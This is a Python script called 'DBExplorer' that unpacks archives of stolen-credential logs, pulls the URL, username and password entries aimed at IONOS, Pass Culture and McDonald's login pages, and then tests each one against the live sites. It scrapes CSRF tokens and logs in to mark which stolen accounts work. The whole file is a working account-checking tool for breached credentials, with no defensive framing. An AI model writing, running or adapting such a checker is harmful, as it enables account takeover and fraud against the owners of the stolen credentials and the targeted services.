import zipfile
import rarfile
import os
import re
import sys
from termcolor import colored
from pyfiglet import Figlet
import requests
from bs4 import BeautifulSoup

def print_banner():
    custom_fig = Figlet(font='slant')
    print(custom_fig.renderText('DBExplorer'))

def extract_archive(filename, password, output_path):
    if zipfile.is_zipfile(filename):
        with zipfile.ZipFile(filename) as zip_file:
            zip_file.extractall(path=output_path, pwd=password.encode() if password else None)
    elif rarfile.is_rarfile(filename):
        with rarfile.RarFile(filename) as rar_file:
            rar_file.extractall(path=output_path, pwd=password.encode() if password else None)
    else:
        print(colored('Error: unsupported archive format', 'red'))
        sys.exit(1)

def find_passwords(keyword):
    results = []
    for root, dirs, files in os.walk('dbdtemp'):
        for filename in files:
            if filename.lower() == 'passwords.txt':
                with open(os.path.join(root, filename), 'r') as f:
                    contents = f.read()
                    matches = re.findall(f'URL:.*\nUsername:.*\nPassword:.*\nApplication:.*\n=*', contents)
                    for match in matches:
                        if keyword in match:
                            url_match = re.search(r'URL:\s*(.*)\n', match)
                            if url_match:
                                url = url_match.group(1)
                                if 'login.ionos' in url or (keyword == 'passculture' and 'passculture' in url) or (keyword == 'mcdo' and 'mcdonalds' in url):
                                    username_match = re.search(r'Username:\s*(.*)\n', match)
                                    password_match = re.search(r'Password:\s*(.*)\n', match)
                                    app_match = re.search(r'Application:\s*(.*)\n', match)
                                    if username_match and password_match and app_match:
                                        username = username_match.group(1)
                                        password = password_match.group(1)
                                        app = app_match.group(1)
                                        results.append((url, username, password, app))
    return results


def test_ionos_credentials(url, username, password):
    try:
        session = requests.Session()
        if url.endswith('/'):
            url = url[:-1]
        login_url = f'{url}/login'
        r = session.get(login_url)
        soup = BeautifulSoup(r.content, 'html.parser')
        csrf_token = soup.find('input', {'name': '_csrf_token'})['value']
        login_data = {
            '_csrf_token': csrf_token,
            'login': username,
            'password': password
        }
        response = session.post(login_url, data=login_data, allow_redirects=False)
        if response.status_code == 302 and 'my.ionos' in response.headers['Location']:
            return True
    except:
        pass
    return False

def test_passculture_credentials(url, username, password):
    try:
        session = requests.Session()
        if url.endswith('/'):
            url = url[:-1]
        login_url = f'{url}/login_check'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        login_data = {
            '_username': username,
            '_password': password,
            '_csrf_token': ''
        }
        r = session.get(login_url)
        soup = BeautifulSoup(r.content, 'html.parser')
        csrf_token = soup.find('input', {'name': '_csrf_token'})['value']
        login_data['_csrf_token'] = csrf_token
        response = session.post(login_url, data=login_data, headers=headers, allow_redirects=False)
        if response.status_code == 302 and 'dashboard' in response.headers['Location']:
            return True
    except:
        pass
    return False

def test_mcdo_credentials(url, username, password):
    try:
        session = requests.Session()
        if url.endswith('/'):
            url = url[:-1]
        r = session.get(url, timeout=5)
        soup = BeautifulSoup(r.content, 'html.parser')
        csrf_token = soup.find('input', {'name': 'csrfToken'})['value']
        login_data = {
            'csrfToken': csrf_token,
            'userName': username,
            'password': password,
            'rememberMe': 'false'
        }
        response = session.post(url, data=login_data, allow_redirects=False)
        if response.status_code == 302 and 'online.mcd.com' in response.headers['Location']:
            return True
    except:
        pass
    return False

def main():
    print_banner()
    filename = input('Enter the database filename to load: ')
    keyword = input('Enter the keyword to search for: ')
    password = None
    if zipfile.is_zipfile(filename) or rarfile.is_rarfile(filename):
        password_protected = False
        with open(filename, 'rb') as f:
            if f.read(2) == b'PK':
                password_protected = True
        if password_protected:
            password = input('Enter the archive password: ')
        extract_archive(filename, password, 'dbdtemp')
        results = find_passwords(keyword)
        if results:
            print(f'Results for keyword "{keyword}":')
            print('-' * 50)
            print('{:<30} {:<20} {:<20} {:<20}'.format('URL', 'USERNAME', 'PASSWORD', 'APPLICATION'))
            print('=' * 90)
            for url, username, password, app in results:
                if test_ionos_credentials(url, username, password):
                    print(colored('{:<30} {:<20} {:<20} {:<20}'.format(url, username, password, app), 'green'))
                elif test_passculture_credentials(url, username, password):
                    print(colored('{:<30} {:<20} {:<20} {:<20}'.format(url, username, password, app), 'green'))
                elif test_mcdo_credentials(url, username, password):
                    print(colored('{:<30} {:<20} {:<20} {:<20}'.format(url, username, password, app), 'green'))
                else:
                    print(colored('{:<30} {:<20} {:<20} {:<20}'.format(url, username, password, app), 'red'))
                    
    else:
        print(colored('Error: unsupported archive format', 'red'))
        sys.exit(1)

if __name__ == '__main__':
    main()
